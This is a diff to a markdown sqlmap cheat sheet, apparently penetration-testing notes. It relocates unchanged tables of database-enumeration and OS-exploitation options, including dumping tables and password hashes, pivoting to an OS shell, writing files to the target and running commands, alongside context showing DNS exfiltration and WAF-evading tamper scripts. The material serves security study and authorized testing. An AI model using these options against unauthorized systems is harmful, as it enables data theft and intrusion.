@@ -118,6 +118,32 @@ Exfiltrate via DNS or HTTP to a server you control when no output is visible.
 sqlmap -u "<URL>" --dns-domain=<DOMAIN>
 ```
 
+## Database Enumeration
+
+| Option                                          | Purpose                                                                    |
+| :---------------------------------------------- | :------------------------------------------------------------------------- |
+| `--banner --current-user --current-db --is-dba` | DB version, user, DB name, is DBA.                                         |
+| `--users --passwords`                           | Enumerate DB users and hashes (needs high priv).                           |
+| `--dbs`                                         | List all databases.                                                        |
+| `-D <DB> --tables`                              | List tables in database.                                                   |
+| `-D <DB> -T <TABLE> --columns`                  | List columns in table.                                                     |
+| `-D <DB> -T <TABLE> --dump`                     | Dump entire table.                                                         |
+| `-C col1,col2 --dump`                           | Dump only specified columns.                                               |
+| `--start=N --stop=M --dump`                     | Dump rows N through M.                                                     |
+| `--where="cond" --dump`                         | Dump only rows matching condition.                                         |
+| `--dump-all --exclude-sysdbs`                   | Dump all DBs except system (e.g. information_schema, mysql).               |
+| `--is-dba` true →                               | Pivot to `--os-shell` / `--file-read` (RCE).                               |
+| Dump path                                       | `~/.local/share/sqlmap/output/`; use `--dump-format=sqlite` for large DBs. |
+| DBMS root ≠ Linux root                          | DB root can write anywhere only if DBMS runs as Linux root.                |
+
+**OS Exploitation Options**
+
+| Option                     | Description                                                                                     |
+| :------------------------- | :---------------------------------------------------------------------------------------------- |
+| **`--file-write="local"`** | Specifies the local file you want to upload to the target.                                      |
+| **`--file-dest="remote"`** | Specifies the absolute path on the target server where the file should be written.              |
+| **`--os-cmd="cmd"`**       | Executes a single operating system command and retrieves the output.                            |
+
 ## Troubleshooting
 
 - **JSON/XML / APIs:** sqlmap may not detect parameters automatically. Use `-r` with a captured request or raise `--level`.
@@ -245,29 +271,3 @@ Tamper scripts use Python to rewrite the SQL payload *before* it is sent to the 
 | **`symboliclogical`**           | Replaces `AND` and `OR` logical operators with their symbolic counterparts (`&&` and `')`                                          |
 | **`versionedkeywords`**         | Encloses each non-function keyword with (MySQL) versioned comment                                                                  |
 | **`versionedmorekeywords`**     | Encloses each keyword with (MySQL) versioned comment                                                                               |
-
-## Database Enumeration
-
-| Option                                          | Purpose                                                                    |
-| :---------------------------------------------- | :------------------------------------------------------------------------- |
-| `--banner --current-user --current-db --is-dba` | DB version, user, DB name, is DBA.                                         |
-| `--users --passwords`                           | Enumerate DB users and hashes (needs high priv).                           |
-| `--dbs`                                         | List all databases.                                                        |
-| `-D <DB> --tables`                              | List tables in database.                                                   |
-| `-D <DB> -T <TABLE> --columns`                  | List columns in table.                                                     |
-| `-D <DB> -T <TABLE> --dump`                     | Dump entire table.                                                         |
-| `-C col1,col2 --dump`                           | Dump only specified columns.                                               |
-| `--start=N --stop=M --dump`                     | Dump rows N through M.                                                     |
-| `--where="cond" --dump`                         | Dump only rows matching condition.                                         |
-| `--dump-all --exclude-sysdbs`                   | Dump all DBs except system (e.g. information_schema, mysql).               |
-| `--is-dba` true →                               | Pivot to `--os-shell` / `--file-read` (RCE).                               |
-| Dump path                                       | `~/.local/share/sqlmap/output/`; use `--dump-format=sqlite` for large DBs. |
-| DBMS root ≠ Linux root                          | DB root can write anywhere only if DBMS runs as Linux root.                |
-
-**OS Exploitation Options**
-
-| Option                     | Description                                                                                     |
-| :------------------------- | :---------------------------------------------------------------------------------------------- |
-| **`--file-write="local"`** | Specifies the local file you want to upload to the target.                                      |
-| **`--file-dest="remote"`** | Specifies the absolute path on the target server where the file should be written.              |
-| **`--os-cmd="cmd"`**       | Executes a single operating system command and retrieves the output.                            |
